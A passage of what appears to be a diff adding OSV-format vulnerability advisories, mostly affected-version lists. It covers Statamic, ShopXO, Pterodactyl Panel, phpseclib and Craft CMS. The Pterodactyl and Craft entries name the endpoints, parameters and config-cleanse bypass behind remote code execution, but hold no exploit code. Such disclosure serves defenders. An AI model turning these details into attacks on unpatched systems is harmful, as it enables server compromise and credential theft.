+          "v4.43.0",
+          "v4.44.0",
+          "v4.45.0",
+          "v4.46.0",
+          "v4.47.0",
+          "v4.48.0",
+          "v4.49.0",
+          "v4.5.0",
+          "v4.50.0",
+          "v4.51.0",
+          "v4.52.0",
+          "v4.53.0",
+          "v4.53.1",
+          "v4.53.2",
+          "v4.54.0",
+          "v4.55.0",
+          "v4.56.0",
+          "v4.56.1",
+          "v4.57.0",
+          "v4.57.1",
+          "v4.57.2",
+          "v4.57.3",
+          "v4.58.0",
+          "v4.58.1",
+          "v4.58.2",
+          "v4.58.3",
+          "v4.6.0",
+          "v4.7.0",
+          "v4.8.0",
+          "v4.9.0",
+          "v4.9.1",
+          "v4.9.2",
+          "v5.0.0",
+          "v5.0.0-alpha.1",
+          "v5.0.0-alpha.2",
+          "v5.0.0-alpha.3",
+          "v5.0.0-alpha.4",
+          "v5.0.0-alpha.5",
+          "v5.0.0-alpha.6",
+          "v5.0.0-beta.1",
+          "v5.0.0-beta.2",
+          "v5.0.0-beta.3",
+          "v5.0.0-beta.4",
+          "v5.0.1",
+          "v5.0.2",
+          "v5.1.0",
+          "v5.10.0",
+          "v5.11.0",
+          "v5.12.0",
+          "v5.13.0",
+          "v5.14.0",
+          "v5.15.0",
+          "v5.16.0",
+          "v5.17.0",
+          "v5.17.1",
+          "v5.18.0",
+          "v5.19.0",
+          "v5.2.0",
+          "v5.20.0",
+          "v5.21.0",
+          "v5.22.0",
+          "v5.22.1",
+          "v5.23.0",
+          "v5.24.0",
+          "v5.25.0",
+          "v5.26.0",
+          "v5.27.0",
+          "v5.28.0",
+          "v5.29.0",
+          "v5.3.0",
+          "v5.30.0",
+          "v5.31.0",
+          "v5.32.0",
+          "v5.33.0",
+          "v5.33.1",
+          "v5.34.0",
+          "v5.35.0",
+          "v5.36.0",
+          "v5.37.0",
+          "v5.38.0",
+          "v5.38.1",
+          "v5.39.0",
+          "v5.4.0",
+          "v5.40.0",
+          "v5.41.0",
+          "v5.42.0",
+          "v5.42.1",
+          "v5.43.0",
+          "v5.43.1",
+          "v5.43.2",
+          "v5.44.0",
+          "v5.45.0",
+          "v5.45.1",
+          "v5.45.2",
+          "v5.46.0",
+          "v5.46.1",
+          "v5.47.0",
+          "v5.48.0",
+          "v5.48.1",
+          "v5.49.0",
+          "v5.49.1",
+          "v5.5.0",
+          "v5.50.0",
+          "v5.51.0",
+          "v5.52.0",
+          "v5.53.0",
+          "v5.53.1",
+          "v5.54.0",
+          "v5.55.0",
+          "v5.56.0",
+          "v5.57.0",
+          "v5.58.0",
+          "v5.58.1",
+          "v5.59.0",
+          "v5.6.0",
+          "v5.6.1",
+          "v5.6.2",
+          "v5.60.0",
+          "v5.61.0",
+          "v5.62.0",
+          "v5.63.0",
+          "v5.64.0",
+          "v5.65.0",
+          "v5.65.1",
+          "v5.65.2",
+          "v5.66.0",
+          "v5.67.0",
+          "v5.68.0",
+          "v5.69.0",
+          "v5.7.0",
+          "v5.7.1",
+          "v5.7.2",
+          "v5.7.3",
+          "v5.70.0",
+          "v5.71.0",
+          "v5.72.0",
+          "v5.73.0",
+          "v5.73.1",
+          "v5.73.10",
+          "v5.73.11",
+          "v5.73.12",
+          "v5.73.13",
+          "v5.73.14",
+          "v5.73.15",
+          "v5.73.16",
+          "v5.73.17",
+          "v5.73.18",
+          "v5.73.19",
+          "v5.73.2",
+          "v5.73.20",
+          "v5.73.21",
+          "v5.73.22",
+          "v5.73.3",
+          "v5.73.4",
+          "v5.73.5",
+          "v5.73.6",
+          "v5.73.7",
+          "v5.73.8",
+          "v5.73.9",
+          "v5.8.0",
+          "v5.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-2497-6pwj-pwg7/GHSA-2497-6pwj-pwg7.json"
+        }
+      },
+      {
+        "package": {
+          "name": "statamic/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/statamic/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "6.0.0"
+              },
+              {
+                "fixed": "6.20.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v6.0.0",
+          "v6.1.0",
+          "v6.10.0",
+          "v6.11.0",
+          "v6.12.0",
+          "v6.13.0",
+          "v6.14.0",
+          "v6.15.0",
+          "v6.16.0",
+          "v6.17.0",
+          "v6.18.0",
+          "v6.18.1",
+          "v6.19.0",
+          "v6.2.0",
+          "v6.2.1",
+          "v6.2.2",
+          "v6.2.3",
+          "v6.2.4",
+          "v6.2.5",
+          "v6.3.0",
+          "v6.3.1",
+          "v6.3.2",
+          "v6.3.3",
+          "v6.4.0",
+          "v6.4.1",
+          "v6.5.0",
+          "v6.6.0",
+          "v6.6.1",
+          "v6.6.2",
+          "v6.6.3",
+          "v6.7.0",
+          "v6.7.1",
+          "v6.7.2",
+          "v6.7.3",
+          "v6.8.0",
+          "v6.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-2497-6pwj-pwg7/GHSA-2497-6pwj-pwg7.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/security/advisories/GHSA-2497-6pwj-pwg7"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49288"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/statamic/cms"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-200",
+        "CWE-862",
+        "CWE-863"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-26T22:12:21Z",
+      "nvd_published_at": "2026-06-19T19:16:36Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-24cf-848g-762c",
+    "published": "2025-03-29T00:31:34Z",
+    "modified": "2025-04-01T15:12:29.167470Z",
+    "aliases": [
+      "CVE-2025-28094"
+    ],
+    "summary": "ShopXO Vulnerable to Server-Side Request Forgery (SSRF) and Cross-Site Scripting (XSS)",
+    "details": "shopxo v6.4.0 has a ssrf/xss vulnerability in multiple places.",
+    "affected": [
+      {
+        "package": {
+          "name": "shopxo/shopxo",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/shopxo/shopxo"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "last_affected": "6.4.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.1.0",
+          "v1.1.0",
+          "v1.2.0",
+          "v1.3.0",
+          "v1.4.0",
+          "v1.5.0",
+          "v1.6.0",
+          "v1.7.0",
+          "v1.8.0",
+          "v1.8.1",
+          "v1.9.0",
+          "v1.9.1",
+          "v1.9.2",
+          "v1.9.3",
+          "v2.0.0",
+          "v2.0.1",
+          "v2.0.2",
+          "v2.0.3",
+          "v2.2.0",
+          "v2.2.1",
+          "v2.2.2",
+          "v2.2.3",
+          "v2.2.4",
+          "v2.2.5",
+          "v2.2.6",
+          "v2.2.7",
+          "v2.2.8",
+          "v2.2.9",
+          "v2.3.0",
+          "v2.3.1",
+          "v2.3.2",
+          "v2.3.3",
+          "v3.0.0",
+          "v3.0.1",
+          "v3.0.2",
+          "v3.0.3",
+          "v4.0.0",
+          "v5.0.0",
+          "v6.0.0",
+          "v6.1.0",
+          "v6.2.0",
+          "v6.3.0",
+          "v6.4.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-24cf-848g-762c/GHSA-24cf-848g-762c.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-28094"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/gongfuxiang/shopxo"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.yuque.com/morysummer/vx41bz/echzollcdlmllgqo"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-79",
+        "CWE-918"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-04-01T14:20:27Z",
+      "nvd_published_at": "2025-03-28T22:15:18Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-24wv-6c99-f843",
+    "published": "2025-06-19T19:55:27Z",
+    "modified": "2025-06-20T22:35:13.513056Z",
+    "aliases": [
+      "CVE-2025-49132"
+    ],
+    "summary": "Pterodactyl Panel Allows Unauthenticated Arbitrary Remote Code Execution",
+    "details": "## Impact\n\nUsing the `/locales/locale.json` with the `locale` and `namespace` query parameters, a malicious actor is able to execute arbitrary code, without being authenticated.\n\nWith the ability to execute arbitrary code, this vulnerability can be exploited in an infinite number of ways.  It could be used to gain access to the Panel's server, read credentials from the Panel's config (`.env` or otherwise), extract sensitive information from the database (such as user details [username, email, first and last name, hashed password, ip addresses, etc]), access files of servers managed by the panel, etc.\n\n## Patches\n\nThis vulnerability was patched by https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0 and was released under the [`v1.11.11`](https://github.com/pterodactyl/panel/releases/tag/v1.11.11) tag without any other code modifications compared to `v1.11.10`.\n\nFor those who need to patch their installations in-place or apply it on top of other code modifications, a patch file can be retrieved from <https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0.patch> and applied using `git apply`.\n\n## Workarounds\n\nOther than patching the software, there is no workaround in this software.  Disabling the `/locales/locale.json` endpoint at the webserver level is possible, but would break the localization feature wherever it is used.\n\nThe only other workaround relies on an external Web Application Firewall (WAF), such as Cloudflare's WAF with their default ruleset (requires Pro plan or above, Free doesn't have the proper ruleset) to mitigate this attack.\n\nUpdating to [`v1.11.11`](https://github.com/pterodactyl/panel/releases/tag/v1.11.11) or manually patching the software are the only recommended ways to completely mitigate this vulnerability.\n\n## User Notice\n\nShortly after the [`v1.11.11`](https://github.com/pterodactyl/panel/releases/tag/v1.11.11)release and it's announcement, security researchers and malicious actors have been attempting to exploit this vulnerability.  While there hasn't been any official confirmations of breaches or successful exploits of the vulnerability in the wild, it is only a matter of time for those who remain on unpatched versions without any workarounds in place.\n\nThe scope of this vulnerability cannot be fully described, anything is possible.  It is of utmost importance that anyone running a vulnerable version of this software, patch it or update to the latest available version **immediately**.",
+    "affected": [
+      {
+        "package": {
+          "name": "pterodactyl/panel",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/pterodactyl/panel"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.11.11"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v0.1.0-beta",
+          "v0.1.1-beta",
+          "v0.1.2-beta",
+          "v0.2.0-beta",
+          "v0.3.0-beta",
+          "v0.4.0-beta",
+          "v0.4.1-beta",
+          "v0.5.0",
+          "v0.5.0-rc.1",
+          "v0.5.0-rc.2",
+          "v0.5.1",
+          "v0.5.2",
+          "v0.5.3",
+          "v0.5.4",
+          "v0.5.5",
+          "v0.5.6",
+          "v0.5.7",
+          "v0.6.0",
+          "v0.6.0-beta.1",
+          "v0.6.0-beta.2",
+          "v0.6.0-beta.2.1",
+          "v0.6.0-rc.1",
+          "v0.6.1",
+          "v0.6.2",
+          "v0.6.3",
+          "v0.6.4",
+          "v0.7.0",
+          "v0.7.0-beta.1",
+          "v0.7.0-beta.2",
+          "v0.7.0-beta.3",
+          "v0.7.0-beta.4",
+          "v0.7.0-rc.1",
+          "v0.7.0-rc.2",
+          "v0.7.1",
+          "v0.7.10",
+          "v0.7.11",
+          "v0.7.12",
+          "v0.7.13",
+          "v0.7.14",
+          "v0.7.15",
+          "v0.7.16",
+          "v0.7.17",
+          "v0.7.18",
+          "v0.7.19",
+          "v0.7.2",
+          "v0.7.3",
+          "v0.7.4",
+          "v0.7.5",
+          "v0.7.6",
+          "v0.7.7",
+          "v0.7.8",
+          "v0.7.9",
+          "v0.8.0-alpha.1",
+          "v0.8.0-alpha.2",
+          "v1.0.0",
+          "v1.0.0-beta.1",
+          "v1.0.0-beta.2",
+          "v1.0.0-beta.3",
+          "v1.0.0-beta.4",
+          "v1.0.0-beta.5",
+          "v1.0.0-beta.6",
+          "v1.0.0-beta.7",
+          "v1.0.0-rc.1",
+          "v1.0.0-rc.2",
+          "v1.0.0-rc.3",
+          "v1.0.0-rc.4",
+          "v1.0.0-rc.5",
+          "v1.0.0-rc.6",
+          "v1.0.0-rc.7",
+          "v1.0.1",
+          "v1.0.2",
+          "v1.0.3",
+          "v1.1.0",
+          "v1.1.1",
+          "v1.1.2",
+          "v1.1.3",
+          "v1.10.0",
+          "v1.10.1",
+          "v1.10.2",
+          "v1.10.3",
+          "v1.10.4",
+          "v1.11.0",
+          "v1.11.0-rc.1",
+          "v1.11.0-rc.2",
+          "v1.11.1",
+          "v1.11.10",
+          "v1.11.2",
+          "v1.11.3",
+          "v1.11.4",
+          "v1.11.5",
+          "v1.11.6",
+          "v1.11.7",
+          "v1.11.8",
+          "v1.11.9",
+          "v1.2.0",
+          "v1.2.1",
+          "v1.2.2",
+          "v1.3.0",
+          "v1.3.1",
+          "v1.3.2",
+          "v1.4.0",
+          "v1.4.1",
+          "v1.4.2",
+          "v1.5.0",
+          "v1.5.1",
+          "v1.6.0",
+          "v1.6.1",
+          "v1.6.2",
+          "v1.6.3",
+          "v1.6.5",
+          "v1.6.6",
+          "v1.7.0",
+          "v1.8.0",
+          "v1.8.1",
+          "v1.9.0",
+          "v1.9.1",
+          "v1.9.2"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 1.11.10",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-24wv-6c99-f843/GHSA-24wv-6c99-f843.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-49132"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pterodactyl/panel"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pterodactyl/panel/releases/tag/v1.11.11"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-94"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-06-19T19:55:27Z",
+      "nvd_published_at": "2025-06-20T17:15:41Z",
+      "severity": "CRITICAL"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2528-jw5q-ww88",
+    "published": "2026-05-06T17:57:10Z",
+    "modified": "2026-05-06T18:11:13.420206Z",
+    "aliases": [
+      "CVE-2024-27354"
+    ],
+    "summary": "phpseclib: guardrails needed on isPrime and randomPrime",
+    "details": "### Impact\nAnyone trying to generate a prime and testing the primality of a number.\n\n### Patches\nhttps://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575\n\n### Workarounds\nUsing the GMP extension would probably help, assuming that one has its own guardrails.\n\n### Resources\nhttps://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575\nhttps://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf",
+    "affected": [
+      {
+        "package": {
+          "name": "phpseclib/phpseclib",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/phpseclib/phpseclib"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.1.1"
+              },
+              {
+                "fixed": "1.0.23"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.3.0",
+          "0.3.1",
+          "0.3.10",
+          "0.3.5",
+          "0.3.6",
+          "0.3.7",
+          "0.3.8",
+          "0.3.9",
+          "1.0.0",
+          "1.0.1",
+          "1.0.10",
+          "1.0.11",
+          "1.0.12",
+          "1.0.13",
+          "1.0.14",
+          "1.0.15",
+          "1.0.16",
+          "1.0.17",
+          "1.0.18",
+          "1.0.19",
+          "1.0.2",
+          "1.0.20",
+          "1.0.21",
+          "1.0.22",
+          "1.0.3",
+          "1.0.4",
+          "1.0.5",
+          "1.0.6",
+          "1.0.7",
+          "1.0.8",
+          "1.0.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-2528-jw5q-ww88/GHSA-2528-jw5q-ww88.json"
+        }
+      },
+      {
+        "package": {
+          "name": "phpseclib/phpseclib",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/phpseclib/phpseclib"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.0.0"
+              },
+              {
+                "fixed": "2.0.47"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.0.0",
+          "2.0.1",
+          "2.0.10",
+          "2.0.11",
+          "2.0.12",
+          "2.0.13",
+          "2.0.14",
+          "2.0.15",
+          "2.0.16",
+          "2.0.17",
+          "2.0.18",
+          "2.0.19",
+          "2.0.2",
+          "2.0.20",
+          "2.0.21",
+          "2.0.22",
+          "2.0.23",
+          "2.0.24",
+          "2.0.25",
+          "2.0.26",
+          "2.0.27",
+          "2.0.28",
+          "2.0.29",
+          "2.0.3",
+          "2.0.30",
+          "2.0.31",
+          "2.0.32",
+          "2.0.33",
+          "2.0.34",
+          "2.0.35",
+          "2.0.36",
+          "2.0.37",
+          "2.0.38",
+          "2.0.39",
+          "2.0.4",
+          "2.0.40",
+          "2.0.41",
+          "2.0.42",
+          "2.0.43",
+          "2.0.44",
+          "2.0.45",
+          "2.0.46",
+          "2.0.5",
+          "2.0.6",
+          "2.0.7",
+          "2.0.8",
+          "2.0.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-2528-jw5q-ww88/GHSA-2528-jw5q-ww88.json"
+        }
+      },
+      {
+        "package": {
+          "name": "phpseclib/phpseclib",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/phpseclib/phpseclib"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.0.0"
+              },
+              {
+                "fixed": "3.0.36"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "3.0.0",
+          "3.0.1",
+          "3.0.10",
+          "3.0.11",
+          "3.0.12",
+          "3.0.13",
+          "3.0.14",
+          "3.0.15",
+          "3.0.16",
+          "3.0.17",
+          "3.0.18",
+          "3.0.19",
+          "3.0.2",
+          "3.0.20",
+          "3.0.21",
+          "3.0.22",
+          "3.0.23",
+          "3.0.3",
+          "3.0.33",
+          "3.0.34",
+          "3.0.35",
+          "3.0.4",
+          "3.0.5",
+          "3.0.6",
+          "3.0.7",
+          "3.0.8",
+          "3.0.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-2528-jw5q-ww88/GHSA-2528-jw5q-ww88.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27354"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56"
+      },
+      {
+        "type": "WEB",
+        "url": "https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/phpseclib/phpseclib"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-400"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-05-06T17:57:10Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-265m-7826-wjqm",
+    "published": "2026-08-06T20:45:00Z",
+    "modified": "2026-09-01T21:15:06.931812500Z",
+    "aliases": [
+      "CVE-2026-72778"
+    ],
+    "summary": "Craft CMS: Authenticated RCE via `condition.config` JSON cleanse bypass",
+    "details": "Craft CMS has an authenticated remote code execution issue in the control panel element-search condition handling.\n\nCraft cleans the outer request-controlled condition array with `Component::cleanseConfig()`, but `Conditions::createCondition()` later decodes and merges the JSON string in `condition.config` without re-running `cleanseConfig()` on the decoded/merged configuration.\n\nBecause `condition.config` is a JSON string during the first cleanse, Yii special config keys such as `as` ... and `on` ... can be hidden inside it. After JSON decoding, those keys reach FieldLayout object creation and are interpreted by Yii as behavior/event configuration.\n\nThe RCE is semi-blind: the trigger endpoint returns a normal JSON response, and the command output is verified via a server-side file-write side effect retrieved in a subsequent request.\n\n## Preconditions\n\n- The attacker needs an authenticated Craft control panel session.\n- A valid CSRF token is required.\n\n## Impact\n\nAn authenticated control panel user can inject Yii behavior/event configuration after Craft’s intended config cleanse boundary. In the confirmed local lab, this led to command execution as the PHP/web user.\n\nPotential attacker impact:\n- Execute operating system commands as the PHP/web user.\n- Read Craft secrets, environment variables, and application configuration.\n- Access database credentials and stored site content.\n- Modify site content, users, and application state.\n- Pivot to internal services reachable from the Craft host or container.\n- Cause denial of service or establish persistence depending on deployment permissions.",
+    "affected": [
+      {
+        "package": {
+          "name": "craftcms/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/craftcms/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "5.0.0-RC1"
+              },
+              {
+                "fixed": "5.10.6"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "5.0.0",
+          "5.0.0-RC1",
+          "5.0.1",
+          "5.0.2",
+          "5.0.3",
+          "5.0.4",
+          "5.0.5",
+          "5.0.6",
+          "5.1.0",
+          "5.1.1",
+          "5.1.10",
+          "5.1.2",
+          "5.1.3",
+          "5.1.4",
+          "5.1.5",
+          "5.1.6",
+          "5.1.7",
+          "5.1.8",
+          "5.1.9",
+          "5.10.0",
+          "5.10.1",
+          "5.10.2",
+          "5.10.3",
+          "5.10.4",
+          "5.10.4.1",
+          "5.10.5",
+          "5.2.0",
+          "5.2.0-beta.1",
+          "5.2.0-beta.2",
+          "5.2.0-beta.3",
+          "5.2.0-beta.4",
+          "5.2.0-beta.5",
+          "5.2.0-beta.6",
+          "5.2.1",
+          "5.2.10",
+          "5.2.2",
+          "5.2.3",
+          "5.2.4",
+          "5.2.4.1",
+          "5.2.5",
+          "5.2.6",
+          "5.2.7",
+          "5.2.8",
+          "5.2.9",
+          "5.3.0",
+          "5.3.0-beta.1",
+          "5.3.0-beta.2",
+          "5.3.0.1",
+          "5.3.0.2",
+          "5.3.0.3",
+          "5.3.1",
+          "5.3.2",
+          "5.3.3",
+          "5.3.4",
+          "5.3.5",
+          "5.3.6",
+          "5.4.0",
+          "5.4.0.1",
+          "5.4.1",
+          "5.4.10",
+          "5.4.10.1",
+          "5.4.2",
+          "5.4.3",
+          "5.4.4",
+          "5.4.5",
+          "5.4.5.1",
+          "5.4.6",
+          "5.4.7",
+          "5.4.7.1",
+          "5.4.8",
+          "5.4.9",
+          "5.5.0",
+          "5.5.0.1",
+          "5.5.1",
+          "5.5.1.1",
+          "5.5.10",
+          "5.5.2",
+          "5.5.3",
+          "5.5.4",
+          "5.5.5",
+          "5.5.6",
+          "5.5.6.1",
+          "5.5.7",
+          "5.5.8",
+          "5.5.9",
+          "5.6.0",
+          "5.6.0.1",
+          "5.6.0.2",
+          "5.6.1",
+          "5.6.10",
+          "5.6.10.1",
+          "5.6.10.2",
+          "5.6.11",
+          "5.6.12",
+          "5.6.13",
+          "5.6.14",
+          "5.6.15",
+          "5.6.16",
+          "5.6.17",
+          "5.6.2",
+          "5.6.3",
+          "5.6.4",
+          "5.6.5",
+          "5.6.5.1",
+          "5.6.6",
+          "5.6.7",
+          "5.6.8",
+          "5.6.9",
+          "5.6.9.1",
+          "5.7.0",
+          "5.7.0-beta.1",
+          "5.7.0-beta.2",
+          "5.7.1",
+          "5.7.1.1",
+          "5.7.10",
+          "5.7.11",
+          "5.7.2",
+          "5.7.3",
+          "5.7.4",
+          "5.7.5",
+          "5.7.6",
+          "5.7.7",
+          "5.7.8",
+          "5.7.8.1",
+          "5.7.8.2",
+          "5.7.9",
+          "5.8.0",
+          "5.8.1",
+          "5.8.10",
+          "5.8.11",
+          "5.8.12",
+          "5.8.13",
+          "5.8.13.1",
+          "5.8.13.2",
+          "5.8.14",
+          "5.8.15",
+          "5.8.16",
+          "5.8.17",
+          "5.8.18",
+          "5.8.19",
+          "5.8.2",
+          "5.8.20",
+          "5.8.21",
+          "5.8.22",
+          "5.8.23",
+          "5.8.3",
+          "5.8.4",
+          "5.8.5",
+          "5.8.6",
+          "5.8.7",
+          "5.8.8",
+          "5.8.9",
+          "5.9.0",
+          "5.9.0-beta.1",
+          "5.9.0-beta.2",
+          "5.9.1",
+          "5.9.10",
+          "5.9.11",
+          "5.9.12",
+          "5.9.13",
+          "5.9.14",
+          "5.9.15",
+          "5.9.16",
+          "5.9.17",
+          "5.9.18",
+          "5.9.19",
+          "5.9.2",
+          "5.9.20",
+          "5.9.21",
+          "5.9.22",
+          "5.9.23",
+          "5.9.3",
+          "5.9.4",
+          "5.9.5",
+          "5.9.6",
+          "5.9.7",
+          "5.9.8",
+          "5.9.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-265m-7826-wjqm/GHSA-265m-7826-wjqm.json"
+        }
+      },
+      {
+        "package": {
+          "name": "craftcms/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/craftcms/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "4.0.0-RC1"
+              },
+              {
+                "fixed": "4.18.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "4.0.0",
+          "4.0.0-RC1",
+          "4.0.0-RC2",
+          "4.0.0-RC3",
+          "4.0.0.1",
+          "4.0.1",
+          "4.0.2",
+          "4.0.3",
+          "4.0.4",
+          "4.0.5",
+          "4.0.5.1",
+          "4.0.5.2",
+          "4.0.6",
+          "4.1.0",
+          "4.1.0.1",
+          "4.1.0.2",
+          "4.1.1",
+          "4.1.2",
+          "4.1.3",
+          "4.1.4",
+          "4.1.4.1",
+          "4.10.0",
+          "4.10.0-beta.1",
+          "4.10.0-beta.2",
+          "4.10.1",
+          "4.10.2",
+          "4.10.3",
+          "4.10.4",
+          "4.10.5",
+          "4.10.6",
+          "4.10.7",
+          "4.10.8",
+          "4.11.0",
+          "4.11.0.1",
+          "4.11.0.2",
+          "4.11.1",
+          "4.11.2",
+          "4.11.3",
+          "4.11.4",
+          "4.11.5",
+          "4.12.0",
+          "4.12.1",
+          "4.12.2",
+          "4.12.3",
+          "4.12.4",
+          "4.12.4.1",
+          "4.12.5",
+          "4.12.6",
+          "4.12.6.1",
+          "4.12.7",
+          "4.12.8",
+          "4.12.9",
+          "4.13.0",
+          "4.13.1",
+          "4.13.1.1",
+          "4.13.10",
+          "4.13.2",
+          "4.13.3",
+          "4.13.4",
+          "4.13.5",
+          "4.13.6",
+          "4.13.7",
+          "4.13.8",
+          "4.13.9",
+          "4.14.0",
+          "4.14.0.1",
+          "4.14.0.2",
+          "4.14.1",
+          "4.14.10",
+          "4.14.11",
+          "4.14.11.1",
+          "4.14.12",
+          "4.14.13",
+          "4.14.14",
+          "4.14.15",
+          "4.14.2",
+          "4.14.3",
